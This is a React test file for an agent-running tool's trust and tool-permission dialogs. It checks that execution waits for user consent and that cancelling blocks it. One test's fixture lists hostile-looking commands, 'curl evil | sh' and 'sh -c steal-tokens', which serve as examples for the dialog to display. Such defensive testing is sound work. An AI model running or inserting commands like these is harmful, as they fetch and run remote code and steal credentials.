// @vitest-environment jsdom
import { cleanup, render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { useRef } from "react";
import { afterEach, describe, expect, it, vi } from "vitest";
import { parseLoop } from "../src/domain/loop.js";
import { createRunRecord, createRunSnapshot, type RunRecord } from "../src/domain/run.js";
import { ToolGrantDialog, toolGrantText } from "../src/ui/shared/ToolGrantDialog.js";
import { useFactoryRuns } from "../src/ui/features/runs/useFactoryRuns.js";
import { TrustDialog, TRUST_TEXT } from "../src/ui/shared/TrustDialog.js";
import { type ProjectTrust } from "../src/domain/trust.js";
import { trustState } from "./fixtures/trust.js";
import { kiroGrant, projectConfig, respond, step } from "./support/run-branch-ui.js";

afterEach(() => {
  cleanup();
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
  location.hash = "";
});

const kiroRun = (provider: "kiro" | "mock" = "kiro") =>
  createRunRecord(
    createRunSnapshot(
      parseLoop({
        schemaVersion: 2,
        id: "flow",
        name: "Flow",
        version: 1,
        status: "published",
        steps: [step("build", "implementation")],
        dependencies: [],
        groups: [],
        joins: [],
        decisions: [],
        policy: { maxAttemptsPerStep: 2 },
      }),
      { description: "Task" },
      { provider, model: "agent-default" },
    ),
  );

/** The gate as Factory wires it: one hook, the trust and grant dialogs, Execute as focus target. */
const Harness = () => {
  const heading = useRef<HTMLHeadingElement>(null);
  const runs = useFactoryRuns(false);
  const run = runs.runs[0];
  return (
    <>
      <h1 ref={heading} tabIndex={-1}>
        Factory
      </h1>
      {run && <button onClick={() => void runs.execute(run.snapshot.id)}>Execute run</button>}
      <ToolGrantDialog
        mode="run"
        prompt={runs.toolGrantPrompt}
        onAnswer={(choice) => void runs.answerToolGrant(choice)}
        returnFocus={runs.toolGrantReturnFocus}
        fallbackFocus={heading}
      />
      <TrustDialog
        prompt={runs.trustPrompt}
        onAnswer={(choice) => void runs.answerTrust(choice)}
        returnFocus={runs.toolGrantReturnFocus}
        fallbackFocus={heading}
      />
    </>
  );
};

const stubRuntime = (run: RunRecord, trust: ProjectTrust = trustState()) => {
  const calls: string[] = [];
  let current = trust;
  const fetchMock = vi.fn<(input: RequestInfo | URL, init?: RequestInit) => Promise<Response>>(
    async (input, init) => {
      const path = String(input);
      calls.push(`${init?.method ?? "GET"} ${path}`);
      if (path === "/api/runs") return respond({ runs: [run] });
      if (path === "/api/loops/published") return respond({ loops: [] });
      if (path === "/api/tracker") return respond({ configured: false });
      if (path === "/api/project")
        return respond({ project: projectConfig, path: "/repo", revision: "r1", trust: current });
      if (path === "/api/project/trust") {
        current = trustState({ toolGrants: current.toolGrants });
        return respond({ trust: current });
      }
      if (path === "/api/project/tool-grants") {
        current = trustState({ toolGrants: kiroGrant });
        return respond({ trust: current });
      }
      if (path.endsWith("/execute")) return respond({ run }, 202);
      return respond({ error: "unexpected" }, 404);
    },
  );
  vi.stubGlobal("fetch", fetchMock);
  return calls;
};

describe("project trust prompt", () => {
  it("asks to trust an untrusted project, listing its commands, before any grant or execute", async () => {
    const calls = stubRuntime(
      kiroRun(),
      trustState({
        trusted: false,
        review: {
          setupCommand: ["pnpm", "install"],
          runSetupCommands: [{ loop: "Gate", command: ["sh", "-c", "steal-tokens"] }],
          customExecutable: null,
          checkCommands: [{ loop: "Gate", step: "Lint", command: "curl evil | sh" }],
          interruptedRuns: 1,
        },
      }),
    );
    render(<Harness />);
    const user = userEvent.setup();
    await user.click(await screen.findByRole("button", { name: "Execute run" }));
    const dialog = await screen.findByRole("dialog", { name: TRUST_TEXT.title });
    expect(within(dialog).getByText("curl evil | sh")).toBeTruthy();
    expect(within(dialog).getByText("pnpm install")).toBeTruthy();
    expect(within(dialog).getByText("sh -c steal-tokens")).toBeTruthy();
    expect(within(dialog).getByText(/1 interrupted run,/)).toBeTruthy();
    await waitFor(() => expect(document.activeElement?.textContent).toBe("Cancel"));
    await user.click(within(dialog).getByRole("button", { name: "Trust project" }));
    await user.click(await screen.findByRole("button", { name: "Allow and run" }));
    await waitFor(() => expect(calls.some((call) => call.endsWith("/execute"))).toBe(true));
    const trustIndex = calls.indexOf("POST /api/project/trust");
    const grantIndex = calls.indexOf("POST /api/project/tool-grants");
    expect(trustIndex).toBeGreaterThan(-1);
    expect(trustIndex).toBeLessThan(grantIndex);
    expect(grantIndex).toBeLessThan(calls.findIndex((call) => call.endsWith("/execute")));
  });

  it("cancels without trusting or executing", async () => {
    const calls = stubRuntime(kiroRun("mock"), trustState({ trusted: false }));
    render(<Harness />);
    const user = userEvent.setup();
    const execute = await screen.findByRole("button", { name: "Execute run" });
    await user.click(execute);
    await screen.findByRole("dialog", { name: TRUST_TEXT.title });
    await user.keyboard("{Escape}");
    await waitFor(() => expect(screen.queryByRole("dialog")).toBeNull());
    expect(calls).not.toContain("POST /api/project/trust");
    expect(calls.some((call) => call.endsWith("/execute"))).toBe(false);
    await waitFor(() => expect(document.activeElement).toBe(execute));
  });
});

describe("agent tool permission prompt", () => {
  it("asks once with the exact scope, focuses Cancel, and grants before executing", async () => {
    const calls = stubRuntime(kiroRun());
    render(<Harness />);
    const user = userEvent.setup();
    await user.click(await screen.findByRole("button", { name: "Execute run" }));
    const dialog = await screen.findByRole("dialog", { name: toolGrantText.kiro.title });
    expect(within(dialog).getByText(toolGrantText.kiro.scope)).toBeTruthy();
    expect(within(dialog).getByText(toolGrantText.kiro.implication).textContent).toContain(
      "in any directory it chooses",
    );
    await waitFor(() => expect(document.activeElement?.textContent).toBe("Cancel"));
    await user.click(within(dialog).getByRole("button", { name: "Allow and run" }));
    await waitFor(() => expect(calls.some((call) => call.endsWith("/execute"))).toBe(true));
    const grantIndex = calls.indexOf("POST /api/project/tool-grants");
    expect(grantIndex).toBeGreaterThan(-1);
    expect(grantIndex).toBeLessThan(calls.findIndex((call) => call.endsWith("/execute")));
    expect(calls).not.toContain("POST /api/project/trust");
  });

  it("cancels without executing and returns focus to Execute", async () => {
    const calls = stubRuntime(kiroRun());
    render(<Harness />);
    const user = userEvent.setup();
    const execute = await screen.findByRole("button", { name: "Execute run" });
    await user.click(execute);
    await screen.findByRole("dialog");
    await user.keyboard("{Escape}");
    await waitFor(() => expect(screen.queryByRole("dialog")).toBeNull());
    expect(calls.some((call) => call.endsWith("/execute"))).toBe(false);
    await waitFor(() => expect(document.activeElement).toBe(execute));
  });

  it("runs without shell on decline and does not ask again in the same session", async () => {
    const calls = stubRuntime(kiroRun());
    render(<Harness />);
    const user = userEvent.setup();
    const execute = await screen.findByRole("button", { name: "Execute run" });
    await user.click(execute);
    await user.click(await screen.findByRole("button", { name: "Run without shell" }));
    await waitFor(() => expect(calls.filter((call) => call.endsWith("/execute"))).toHaveLength(1));
    await user.click(execute);
    await waitFor(() => expect(calls.filter((call) => call.endsWith("/execute"))).toHaveLength(2));
    expect(screen.queryByRole("dialog")).toBeNull();
    expect(calls).not.toContain("POST /api/project/tool-grants");
  });

  it("skips the prompt for mock-only runs and for projects that already hold the grant", async () => {
    const calls = stubRuntime(kiroRun("mock"));
    render(<Harness />);
    const user = userEvent.setup();
    await user.click(await screen.findByRole("button", { name: "Execute run" }));
    await waitFor(() => expect(calls.some((call) => call.endsWith("/execute"))).toBe(true));
    expect(screen.queryByRole("dialog")).toBeNull();
    cleanup();
    const granted = stubRuntime(kiroRun(), trustState({ toolGrants: kiroGrant }));
    render(<Harness />);
    await user.click(await screen.findByRole("button", { name: "Execute run" }));
    await waitFor(() => expect(granted.some((call) => call.endsWith("/execute"))).toBe(true));
    expect(screen.queryByRole("dialog")).toBeNull();
  });

  it("shows the Codex consent text naming network access and outside writes", () => {
    const heading = { current: null };
    render(
      <ToolGrantDialog
        mode="run"
        prompt={{ provider: "codex", pending: false, error: "" }}
        onAnswer={() => undefined}
        returnFocus={() => null}
        fallbackFocus={heading}
      />,
    );
    expect(screen.getByText(toolGrantText.codex.implication).textContent).toContain(
      "network access and writes outside the project",
    );
    expect(screen.getByText(toolGrantText.codex.implication).textContent).toContain(
      "branches, stash and config",
    );
    // In-sandbox commands still run by default, so the decline choice must not say "no shell".
    expect(screen.getByRole("button", { name: "Keep commands sandboxed" })).toBeTruthy();
    expect(screen.queryByRole("button", { name: "Run without shell" })).toBeNull();
  });
});
